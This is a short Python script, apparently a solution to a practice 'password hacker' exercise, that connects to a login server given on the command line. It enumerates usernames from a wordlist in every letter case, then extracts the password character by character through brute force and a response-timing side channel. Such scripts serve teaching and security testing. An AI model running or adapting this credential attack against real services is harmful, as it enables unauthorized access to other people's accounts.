import socket, sys, json
from string import ascii_lowercase, digits, ascii_uppercase
from itertools import product
from datetime import datetime

args = sys.argv
chars = ascii_lowercase + digits + ascii_uppercase

def brute_force(l=len(chars)+1):
    for i in range(1, l):
        for message in product(chars, repeat = i):
            message = "".join(message)
            yield message

def find_data(type):
    with open(type + ".txt") as file:
        for line in file:
            line = line.strip("\n")
            list = map(lambda x: "".join(x), product(*([letter.lower(), letter.upper()]
                                                       for letter in line)))
            for data in list:
                yield data

def admin_login(login=0, pw = " "):
    if login == 0:
        message = find_data("logins")
    else:
        message = brute_force(2)
    while 1:
        if pw == " ":
            login = next(message)
        else:
            pw = pw + next(message)
        data_json = json.dumps({"login" : login, "password" : pw})
        start = datetime.now()
        client_socket.send(data_json.encode())
        recieve = client_socket.recv(1024)
        finish = datetime.now()
        recieve_json = json.loads(recieve.decode())
        if recieve_json["result"] == "Wrong password!" and pw == " ":
            return login
        elif (finish - start).microseconds > 90000:
            message = brute_force(2)
        elif recieve_json["result"] == "Wrong password!":
            pw = pw[:-1]
        elif recieve_json["result"] == "Connection success!":
            return pw

with socket.socket() as client_socket:
    addresse = (args[1], int(args[2]))
    client_socket.connect(addresse)
    login = admin_login()
    pw = admin_login(login, "")
    data_json = json.dumps({"login" : login, "password" : pw})
    print(data_json)









